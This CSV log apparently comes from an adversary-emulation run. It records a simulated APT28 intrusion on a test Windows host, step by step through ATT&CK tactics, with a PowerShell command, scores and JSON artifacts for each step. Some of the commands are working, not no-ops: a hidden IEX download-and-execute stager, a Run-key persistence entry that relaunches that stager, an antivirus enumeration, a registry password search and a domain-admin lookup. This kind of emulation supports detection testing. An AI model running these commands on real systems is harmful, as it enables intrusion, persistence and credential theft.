timestamp,threat_actor,status,tactic,technique_id,technique_name,platform,delay_seconds,duration_seconds,description,command,expected_result,mcdm_score,artifacts_json,step_json
2026-03-17T12:29:07.259520+00:00,APT28,success,Reconnaissance,T1592.002,Gather Victim Host Information: Software,windows,1.0,6.0,Enumerate OS and endpoint security products to inform targeting and evasion.,"powershell -NoP -W Hidden -C ""Get-CimInstance Win32_OperatingSystem | Select-Object Caption,Version,BuildNumber; Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState""",OS details and AV products collected (name/state) for situational awareness.,7.45,"{""host"": ""WS-01"", ""domain"": ""corp.local"", ""user"": ""CORP\\j.doe"", ""command_preview"": ""powershell -NoP -W Hidden -C \""Get-CimInstance Win32_OperatingSystem | Select-Object Caption,Version,BuildNumber; Get-CimInstance -Namespace root/SecurityCenter2 -ClassName Antiviru"", ""simulated"": true, ""threat_actor"": ""APT28"", ""telemetry"": {""event_count"": 3, ""sources"": [""process"", ""powershell"", ""net""]}}","{""tactic"": ""Reconnaissance"", ""technique_id"": ""T1592.002"", ""technique_name"": ""Gather Victim Host Information: Software"", ""description"": ""Enumerate OS and endpoint security products to inform targeting and evasion."", ""command"": ""powershell -NoP -W Hidden -C \""Get-CimInstance Win32_OperatingSystem | Select-Object Caption,Version,BuildNumber; Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState\"""", ""expected_result"": ""OS details and AV products collected (name/state) for situational awareness."", ""platform"": ""windows"", ""timing"": {""delay_seconds"": 1.0, ""duration_seconds"": 6.0}, ""mcdm"": {""score"": 7.45, ""criteria"": {""stealth"": 8, ""reliability"": 9, ""impact"": 4, ""speed"": 7, ""complexity"": 3}, ""tags"": [""living_off_the_land"", ""stealthy""], ""actor"": ""APT28""}}"
2026-03-17T12:29:15.273370+00:00,APT28,success,Initial Access,T1566.001,Phishing: Spearphishing Attachment,windows,2.0,2.0,Stage a macro-lure attachment delivery (simulated) to represent initial access.,"powershell -NoP -W Hidden -C ""$lure=Invoice_Q1_2026.xlsm; Write-Output (Staged lure: +$lure)""",Lure staged; user execution is assumed in this simulation.,6.4,"{""host"": ""WS-01"", ""domain"": ""corp.local"", ""user"": ""CORP\\j.doe"", ""command_preview"": ""powershell -NoP -W Hidden -C \""$lure=Invoice_Q1_2026.xlsm; Write-Output (Staged lure: +$lure)\"""", ""simulated"": true, ""threat_actor"": ""APT28""}","{""tactic"": ""Initial Access"", ""technique_id"": ""T1566.001"", ""technique_name"": ""Phishing: Spearphishing Attachment"", ""description"": ""Stage a macro-lure attachment delivery (simulated) to represent initial access."", ""command"": ""powershell -NoP -W Hidden -C \""$lure=Invoice_Q1_2026.xlsm; Write-Output (Staged lure: +$lure)\"""", ""expected_result"": ""Lure staged; user execution is assumed in this simulation."", ""platform"": ""windows"", ""timing"": {""delay_seconds"": 2.0, ""duration_seconds"": 2.0}, ""mcdm"": {""score"": 6.4, ""criteria"": {""stealth"": 6, ""reliability"": 7, ""impact"": 6, ""speed"": 8, ""complexity"": 4}, ""tags"": [""commodity"", ""fast""], ""actor"": ""APT28""}}"
2026-03-17T12:29:18.791784+00:00,APT28,success,Execution,T1059.001,Command and Scripting Interpreter: PowerShell,windows,1.5,4.0,Execute a PowerShell stager (simulated) to represent in-memory payload execution.,"powershell -NoP -W Hidden -C ""$s=IEX (New-Object Net.WebClient).DownloadString(http://intranet.local/update.ps1); Write-Output Stager prepared""",Stager logic invoked; remote script retrieval would occur in a real engagement.,7.05,"{""host"": ""WS-01"", ""domain"": ""corp.local"", ""user"": ""CORP\\j.doe"", ""command_preview"": ""powershell -NoP -W Hidden -C \""$s=IEX (New-Object Net.WebClient).DownloadString(http://intranet.local/update.ps1); Write-Output Stager prepared\"""", ""simulated"": true, ""threat_actor"": ""APT28""}","{""tactic"": ""Execution"", ""technique_id"": ""T1059.001"", ""technique_name"": ""Command and Scripting Interpreter: PowerShell"", ""description"": ""Execute a PowerShell stager (simulated) to represent in-memory payload execution."", ""command"": ""powershell -NoP -W Hidden -C \""$s=IEX (New-Object Net.WebClient).DownloadString(http://intranet.local/update.ps1); Write-Output Stager prepared\"""", ""expected_result"": ""Stager logic invoked; remote script retrieval would occur in a real engagement."", ""platform"": ""windows"", ""timing"": {""delay_seconds"": 1.5, ""duration_seconds"": 4.0}, ""mcdm"": {""score"": 7.05, ""criteria"": {""stealth"": 7, ""reliability"": 8, ""impact"": 6, ""speed"": 7, ""complexity"": 4}, ""tags"": [""living_off_the_land""], ""actor"": ""APT28""}}"
2026-03-17T12:29:24.819286+00:00,APT28,success,Persistence,T1547.001,Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,windows,2.0,3.0,Simulate persistence via HKCU Run key for user-level autostart.,"powershell -NoP -W Hidden -C ""reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveSync /t REG_SZ /d powershell -NoP -W Hidden -C IEX(New-Object Net.WebClient).DownloadString(http://intranet.local/u.ps1) /f""",Run key established to execute on user logon.,6.8,"{""host"": ""WS-01"", ""domain"": ""corp.local"", ""user"": ""CORP\\j.doe"", ""command_preview"": ""powershell -NoP -W Hidden -C \""reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v OneDriveSync /t REG_SZ /d powershell -NoP -W Hidden -C IEX(New-Object Net.WebClient).Dow"", ""simulated"": true, ""threat_actor"": ""APT28""}","{""tactic"": ""Persistence"", ""technique_id"": ""T1547.001"", ""technique_name"": ""Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"", ""description"": ""Simulate persistence via HKCU Run key for user-level autostart."", ""command"": ""powershell -NoP -W Hidden -C \""reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v OneDriveSync /t REG_SZ /d powershell -NoP -W Hidden -C IEX(New-Object Net.WebClient).DownloadString(http://intranet.local/u.ps1) /f\"""", ""expected_result"": ""Run key established to execute on user logon."", ""platform"": ""windows"", ""timing"": {""delay_seconds"": 2.0, ""duration_seconds"": 3.0}, ""mcdm"": {""score"": 6.8, ""criteria"": {""stealth"": 7, ""reliability"": 8, ""impact"": 5, ""speed"": 7, ""complexity"": 4}, ""tags"": [""stealthy""], ""actor"": ""APT28""}}"
2026-03-17T12:29:29.836282+00:00,APT28,success,Privilege Escalation,T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,windows,2.0,5.0,Simulate a UAC bypass attempt via fodhelper-style registry hijack (no-op).,"powershell -NoP -W Hidden -C ""Write-Output Simulating UAC bypass via fodhelper registry hijack""",Elevated execution attempted; may succeed only if host configuration is vulnerable.,6.05,"{""host"": ""WS-01"", ""domain"": ""corp.local"", ""user"": ""CORP\\j.doe"", ""command_preview"": ""powershell -NoP -W Hidden -C \""Write-Output Simulating UAC bypass via fodhelper registry hijack\"""", ""simulated"": true, ""threat_actor"": ""APT28""}","{""tactic"": ""Privilege Escalation"", ""technique_id"": ""T1548.002"", ""technique_name"": ""Abuse Elevation Control Mechanism: Bypass User Account Control"", ""description"": ""Simulate a UAC bypass attempt via fodhelper-style registry hijack (no-op)."", ""command"": ""powershell -NoP -W Hidden -C \""Write-Output Simulating UAC bypass via fodhelper registry hijack\"""", ""expected_result"": ""Elevated execution attempted; may succeed only if host configuration is vulnerable."", ""platform"": ""windows"", ""timing"": {""delay_seconds"": 2.0, ""duration_seconds"": 5.0}, ""mcdm"": {""score"": 6.05, ""criteria"": {""stealth"": 7, ""reliability"": 5, ""impact"": 6, ""speed"": 6, ""complexity"": 6}, ""tags"": [""stealthy""], ""actor"": ""APT28""}}"
2026-03-17T12:29:35.849051+00:00,APT28,success,Defense Evasion,T1036.005,Masquerading: Match Legitimate Name or Location,windows,1.0,3.0,Simulate dropping/renaming a binary to appear legitimate in common directories.,"powershell -NoP -W Hidden -C ""$p=C:\ProgramData\Microsoft\Windows\Caches\svch0st.exe; Write-Output (Simulating masquerade drop: +$p)""",Masqueraded artifact path created/recorded for downstream telemetry simulation.,7.25,"{""host"": ""WS-01"", ""domain"": ""corp.local"", ""user"": ""CORP\\j.doe"", ""command_preview"": ""powershell -NoP -W Hidden -C \""$p=C:\\ProgramData\\Microsoft\\Windows\\Caches\\svch0st.exe; Write-Output (Simulating masquerade drop: +$p)\"""", ""simulated"": true, ""threat_actor"": ""APT28"", ""blocked_actions"": [""wevtutil Security disable (may require admin)""]}","{""tactic"": ""Defense Evasion"", ""technique_id"": ""T1036.005"", ""technique_name"": ""Masquerading: Match Legitimate Name or Location"", ""description"": ""Simulate dropping/renaming a binary to appear legitimate in common directories."", ""command"": ""powershell -NoP -W Hidden -C \""$p=C:\\ProgramData\\Microsoft\\Windows\\Caches\\svch0st.exe; Write-Output (Simulating masquerade drop: +$p)\"""", ""expected_result"": ""Masqueraded artifact path created/recorded for downstream telemetry simulation."", ""platform"": ""windows"", ""timing"": {""delay_seconds"": 1.0, ""duration_seconds"": 3.0}, ""mcdm"": {""score"": 7.25, ""criteria"": {""stealth"": 8, ""reliability"": 8, ""impact"": 5, ""speed"": 6, ""complexity"": 4}, ""tags"": [""stealthy"", ""living_off_the_land""], ""actor"": ""APT28""}}"
2026-03-17T12:29:40.349749+00:00,APT28,success,Credential Access,T1552.002,Unsecured Credentials: Credentials in Registry,windows,1.5,5.0,Simulate searching the registry for stored credentials/config values (safer LoTL).,"powershell -NoP -W Hidden -C ""reg query HKCU\Software /s /f password 2>$null | Select-Object -First 20""",Potential credential strings discovered in registry queries (simulation).,6.8,"{""host"": ""WS-01"", ""domain"": ""corp.local"", ""user"": ""CORP\\j.doe"", ""command_preview"": ""powershell -NoP -W Hidden -C \""reg query HKCU\\Software /s /f password 2>$null | Select-Object -First 20\"""", ""simulated"": true, ""threat_actor"": ""APT28"", ""credential_type"": ""ntlm_hash"", ""credential_material"": ""aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99"", ""note"": ""Placeholder hash for simulation only.""}","{""tactic"": ""Credential Access"", ""technique_id"": ""T1552.002"", ""technique_name"": ""Unsecured Credentials: Credentials in Registry"", ""description"": ""Simulate searching the registry for stored credentials/config values (safer LoTL)."", ""command"": ""powershell -NoP -W Hidden -C \""reg query HKCU\\Software /s /f password 2>$null | Select-Object -First 20\"""", ""expected_result"": ""Potential credential strings discovered in registry queries (simulation)."", ""platform"": ""windows"", ""timing"": {""delay_seconds"": 1.5, ""duration_seconds"": 5.0}, ""mcdm"": {""score"": 6.8, ""criteria"": {""stealth"": 7, ""reliability"": 6, ""impact"": 6, ""speed"": 6, ""complexity"": 4}, ""tags"": [""stealthy"", ""living_off_the_land""], ""actor"": ""APT28""}}"
2026-03-17T12:29:46.864421+00:00,APT28,success,Discovery,T1087.002,Account Discovery: Domain Account,windows,1.5,5.0,Enumerate domain users and Domain Admins membership.,"powershell -NoP -W Hidden -C ""whoami; net user /domain; net group Domain Admins /domain""",Domain users enumerated and privileged group membership identified.,7.1,"{""host"": ""WS-01"", ""domain"": ""corp.local"", ""user"": ""CORP\\j.doe"", ""command_preview"": ""powershell -NoP -W Hidden -C \""whoami; net user /domain; net group Domain Admins /domain\"""", ""simulated"": true, ""threat_actor"": ""APT28"", ""telemetry"": {""event_count"": 3, ""sources"": [""process"", ""powershell"", ""net""]}}","{""tactic"": ""Discovery"", ""technique_id"": ""T1087.002"", ""technique_name"": ""Account Discovery: Domain Account"", ""description"": ""Enumerate domain users and Domain Admins membership."", ""command"": ""powershell -NoP -W Hidden -C \""whoami; net user /domain; net group Domain Admins /domain\"""", ""expected_result"": ""Domain users enumerated and privileged group membership identified."", ""platform"": ""windows"", ""timing"": {""delay_seconds"": 1.5, ""duration_seconds"": 5.0}, ""mcdm"": {""score"": 7.1, ""criteria"": {""stealth"": 6, ""reliability"": 9, ""impact"": 6, ""speed"": 7, ""complexity"": 3}, ""tags"": [""living_off_the_land""], ""actor"": ""APT28""}}"
2026-03-17T12:29:52.893847+00:00,APT28,success,Discovery,T1016,System Network Configuration Discovery,windows,1.0,4.0,"Enumerate IP config, routes, and neighbor info to map network paths.","powershell -NoP -W Hidden -C ""ipconfig /all; route print; arp -a""",Network configuration and routing information collected.,6.6,"{""host"": ""WS-01"", ""domain"": ""corp.local"", ""user"": ""CORP\\j.doe"", ""command_preview"": ""powershell -NoP -W Hidden -C \""ipconfig /all; route print; arp -a\"""", ""simulated"": true, ""threat_actor"": ""APT28"", ""telemetry"": {""event_count"": 3, ""sources"": [""process"", ""powershell"", ""net""]}}","{""tactic"": ""Discovery"", ""technique_id"": ""T1016"", ""technique_name"": ""System Network Configuration Discovery"", ""description"": ""Enumerate IP config, routes, and neighbor info to map network paths."", ""command"": ""powershell -NoP -W Hidden -C \""ipconfig /all; route print; arp -a\"""", ""expected_result"": ""Network configuration and routing information collected."", ""platform"": ""windows"", ""timing"": {""delay_seconds"": 1.0, ""duration_seconds"": 4.0}, ""mcdm"": {""score"": 6.6, ""criteria"": {""stealth"": 6, ""reliability"": 9, ""impact"": 4, ""speed"": 8, ""complexity"": 2}, ""tags"": [""fast""], ""actor"": ""APT28""}}"
2026-03-17T12:29:58.910435+00:00,APT28,success,Lateral Movement,T1021.006,Remote Services: Windows Remote Management,windows,2.0,5.0,Simulate WinRM-based lateral movement (LoTL) to a server.,"powershell -NoP -W Hidden -C ""$t=FS01.corp.local; Write-Output (Simulating WinRM session to +$t)""",Remote command execution channel established if WinRM enabled and creds valid.,7.2,"{""host"": ""WS-01"", ""domain"": ""corp.local"", ""user"": ""CORP\\j.doe"", ""command_preview"": ""powershell -NoP -W Hidden -C \""$t=FS01.corp.local; Write-Output (Simulating WinRM session to +$t)\"""", ""simulated"": true, ""threat_actor"": ""APT28"", ""target_host"": ""FS01.corp.local"", ""remote_service"": ""rdp""}","{""tactic"": ""Lateral Movement"", ""technique_id"": ""T1021.006"", ""technique_name"": ""Remote Services: Windows Remote Management"", ""description"": ""Simulate WinRM-based lateral movement (LoTL) to a server."", ""command"": ""powershell -NoP -W Hidden -C \""$t=FS01.corp.local; Write-Output (Simulating WinRM session to +$t)\"""", ""expected_result"": ""Remote command execution channel established if WinRM enabled and creds valid."", ""platform"": ""windows"", ""timing"": {""delay_seconds"": 2.0, ""duration_seconds"": 5.0}, ""mcdm"": {""score"": 7.2, ""criteria"": {""stealth"": 7, ""reliability"": 7, ""impact"": 7, ""speed"": 7, ""complexity"": 5}, ""tags"": [""living_off_the_land"", ""stealthy""], ""actor"": ""APT28""}}"
